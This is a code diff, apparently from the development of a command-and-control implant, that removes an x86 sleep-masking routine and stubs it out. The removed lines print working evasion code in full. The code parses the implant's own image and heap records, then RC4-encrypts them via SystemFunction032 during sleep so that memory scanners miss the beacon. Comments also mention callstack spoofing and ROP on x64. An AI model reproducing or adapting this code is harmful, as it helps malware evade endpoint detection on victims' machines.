@@ -905,9 +905,12 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 	return FALSE;   /* caller takes the plan-B loop for error handling */
 }
 
-#else /* !_M_X64: x86 Gen3 1a — RC4 masking, no ROP (callstack spoof stays
-       * x64-only; x86's unwinding/telemetry surface differs and the official
-       * BOF is unusable here anyway - it crashes at blob+0x3b in WOW64). */
+#else /* !_M_X64: x86 gen3-1a REMOVED (round 23) - the slice compiles but the
+       * x86 sleeve has only ~2KB of margin and gen3-1a costs ~2.5KB (live:
+       * 249376 > cap 247840). The official sleepmask BOF crashes in WOW64
+       * (blob+0x3b), so x86 stays UNMASKED by design until the size budget
+       * is solved (candidate: drop spawn_x86 globals or trim gate wrappers
+       * on x86, or a dedicated x86-only minimal masker). */
 
 BOOL gen3_wait_pipe(HANDLE pipe)
 {
@@ -915,154 +918,10 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 	return FALSE;
 }
 
-/* x86 slice of the gen3 family: same block snapshot + rotated-key RC4 as
- * the x64 1a path (own-table sections + tracked heap, in-image and
- * non-writable records skipped, .text excluded), served over a plain
- * pointer-resolved Sleep. This replaces the crashing official sleepmask
- * BOF (blob+0x3b in WOW64) with our own masking - the x86 own-table
- * battle folded into the gen3 family instead of fighting the official
- * blob's layout assumptions. */
-static G3_SF032 g3_sf032_x86;
-
-static int g3_snap_x86(G3_BLOCK * out, int max)
-{
-	GARGLEP parms = *gparms;
-	HEAP_RECORD * hr = track_memory_get_heap_records_to_mask();
-	DWORD * sec;
-	int n = 0;
-	DWORD text_va = 0, text_end = 0;
-	DWORD sizeimg = 0;
-
-	{
-		unsigned char * pe = (unsigned char *)parms.beacon_ptr;
-		DWORD lfanew = *(DWORD *)(pe + 0x3C);
-		WORD nsec = *(WORD *)(pe + lfanew + 6);
-		WORD optsz = *(WORD *)(pe + lfanew + 20);
-		DWORD secoff = lfanew + 24 + optsz;
-		WORD i;
-		sizeimg = *(DWORD *)(pe + lfanew + 24 + 0x38);
-		for (i = 0; i < nsec; i++) {
-			unsigned char * so = pe + secoff + (DWORD)i * 40;
-			if (memcmp(so, ".text", 5) == 0) {
-				DWORD vsz = *(DWORD *)(so + 8);
-				text_va = *(DWORD *)(so + 12);
-				text_end = text_va + (vsz ? vsz : *(DWORD *)(so + 16));
-				break;
-			}
-		}
-	}
-
-	sec = (DWORD *)parms.sections;
-	if (sec != NULL) {
-		while (n + 1 < max) {
-			DWORD a = sec[0], b = sec[1];
-			if (a == 0 && b == 0)
-				break;
-			if (b > a) {
-				BOOL overlaps_text = (a < text_end && b > text_va);
-				if (!overlaps_text) {
-					if (g3_page_writable((unsigned char *)parms.beacon_ptr + a)) {
-						out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
-						out[n].len = b - a;
-						n++;
-					}
-				}
-				else if (a < text_va) {
-					if (g3_page_writable((unsigned char *)parms.beacon_ptr + a)) {
-						out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
-						out[n].len = text_va - a;
-						n++;
-					}
-				}
-			}
-			sec += 2;
-		}
-	}
-
-	{
-		unsigned char * img_lo = (unsigned char *)parms.beacon_ptr;
-		unsigned char * img_hi = img_lo + sizeimg;
-
-		while (n < max && hr != NULL && hr->ptr != NULL) {
-			unsigned char * hp = (unsigned char *)hr->ptr;
-			unsigned char * he = hp + hr->size;
-
-			if (hr->size > 0 && hr->size < 0x40000000) {
-				if (hp >= img_lo && he <= img_hi) {
-					/* in-image: already covered by the section block */
-				}
-				else {
-					if (hp < img_lo && he > img_lo)
-						he = img_lo;
-					if (hp < img_hi && he > img_hi)
-						hp = img_hi;
-					if (hp < he && g3_page_writable(hp)) {
-						out[n].ptr = hp;
-						out[n].len = (unsigned long)(he - hp);
-						n++;
-					}
-				}
-			}
-			hr++;
-		}
-	}
-
-	return n;
-}
-
 BOOL gen3_sleep(DWORD time)
 {
-	unsigned char key[16];
-	G3_BLOCK blocks[G3_MAX_BLOCKS];
-	G3_MASKCTX mctx;
-	int nblocks;
-	int i;
-	void (WINAPI *psleep)(DWORD);
-
-	if (g3_sf032_x86 == NULL) {
-		g3_sf032_x86 = (G3_SF032)GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction032");
-		if (g3_sf032_x86 == NULL)
-			return FALSE;
-	}
-	if (gparms == NULL)
-		gargle_setup_parms(NULL, NULL, 0);
-
-	psleep = (void (WINAPI *)(DWORD))GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
-	if (psleep == NULL)
-		return FALSE;
-
-	{
-		unsigned int * k = (unsigned int *)key;
-		for (i = 0; i < 4; i++)
-			k[i] = bigger_rand();
-	}
-
-	nblocks = g3_snap_x86(blocks, G3_MAX_BLOCKS);
-	if (nblocks == 0) {
-		psleep(time);
-		return TRUE; /* nothing to mask: served the window unmasked */
-	}
-
-	mctx.blocks = blocks;
-	mctx.nblocks = nblocks;
-	for (i = 0; i < 16; i++)
-		mctx.key[i] = key[i];
-	mctx.fn = g3_sf032_x86;
-
-	/* mask -> sleep -> unmask. The window contract holds: no API inside
-	 * the span (psleep pre-resolved), key/fn/blocks all stack or callee
-	 * memory, .text excluded so the return path stays executable. */
-	for (i = 0; i < nblocks; i++)
-		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-	psleep(time);
-	for (i = 0; i < nblocks; i++)
-		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-
-	for (i = 0; i < 16; i++)
-		key[i] = 0;
-	for (i = 0; i < (int)sizeof(mctx); i++)
-		((unsigned char *)&mctx)[i] = 0;
-	return TRUE;
+	(void)time;
+	return FALSE;
 }
 
 #endif /* _M_X64 */
